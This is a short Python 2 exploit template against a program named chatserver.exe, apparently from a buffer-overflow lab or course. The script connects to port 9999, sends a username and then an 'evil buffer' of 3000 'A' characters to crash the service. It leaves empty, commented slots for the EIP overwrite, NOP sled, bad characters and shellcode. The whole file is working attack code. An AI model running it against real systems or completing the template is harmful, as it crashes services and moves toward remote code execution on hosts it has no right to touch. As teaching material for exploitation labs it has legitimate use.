#!/usr/bin/python
# ------------------------------------------------------------info
# Software name: chatserver.exe
# Vulnerable Input: Message
# Target IP: 
# PoC Crash Length: 3000
# EIP Overwrite: 
# Bad Characters: \x00
# Vulnerable Module: 
# JMP ESP address [eg.0x1480111e]:
# JMP ESP address little endian [eg.\x1e\x11\x80\x14]: 
# Shellcode jump code: N/A
# !!! Comment what you are adjusting in the code !!!
import socket,sys
target = '<ip>' # Target IP
port = 9999 # Target Port
uname = "Jack"# Added for username input
# ! CODE !
# Buffer Values
filler = "A" * 3000
# eip =
# nop =
# pattern = ("")
# badchars = ("")
# shellcode = ("")
#-----------Exploit-Code--------------------------------------------
try:
  print "\n[+]Sending evil buffer..."
  buffer = filler
# buffer = pattern
# buffer += eip
# buffer += nop
# buffer += badchars
# buffer += shellcode
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,port))
  s.recv(1024)
  s.send(uname + '\r\n')
  s.recv(1024)
  s.send(buffer + '\r\n')
  s.recv(1024)
except:
  print "\n[!]Could not connect[!]"
  sys.exit(0)
finally:
  s.close()

